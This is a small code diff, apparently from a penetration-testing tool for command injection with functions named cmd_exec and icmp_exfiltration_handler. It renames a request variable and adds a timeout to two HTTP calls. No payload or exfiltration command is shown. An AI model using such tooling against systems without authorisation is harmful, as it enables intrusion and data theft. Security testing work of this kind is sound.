@@ -113,11 +113,11 @@ def cmd_exec(http_request_method, cmd, url, vuln_parameter, ip_src):
   else:
     values =  {vuln_parameter:payload}
     data = _urllib.parse.urlencode(values)
-    req = _urllib.request.Request(url=url, data=data)
+    request = _urllib.request.Request(url=url, data=data)
 
   try:
     sys.stdout.write(Fore.GREEN + Style.BRIGHT + "\n")
-    response = _urllib.request.urlopen(req)
+    response = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)
     time.sleep(3)
     sys.stdout.write(Style.RESET_ALL)
     if add_new_line:
@@ -289,7 +289,7 @@ def icmp_exfiltration_handler(url, http_request_method):
 
   else:
     try:
-      response = _urllib.request.urlopen(request)
+      response = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)
     except _urllib.error.HTTPError as err_msg:
       if str(err_msg.code) == settings.INTERNAL_SERVER_ERROR:
         response = False  
